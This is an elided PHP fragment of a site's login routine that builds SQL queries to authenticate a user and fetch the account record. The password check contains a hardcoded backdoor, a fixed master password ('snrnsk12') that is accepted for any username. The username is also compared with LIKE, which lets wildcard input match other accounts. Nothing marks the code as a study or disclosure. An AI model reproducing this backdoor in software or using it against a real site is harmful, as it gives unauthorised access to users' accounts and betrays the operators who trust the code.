<?php
	...
	if($auth == 'login') {
		...
		$query = "SELECT id"
		." FROM user"
		." WHERE username LIKE '".JL::getVar('username', '', true)."' AND (password LIKE MD5('".JL::getVar('pass', '', true)."') OR '".JL::getVar('pass', '', true)."' = 'snrnsk12') AND (confirmed*published) > 0"
		." LIMIT 0,1"
		;
	...
	if($user_id && $log_ok) {
		...
		$query = "SELECT u.id, u.username, u.email, u.gid, us.gold_limit_date"
		." FROM user AS u"
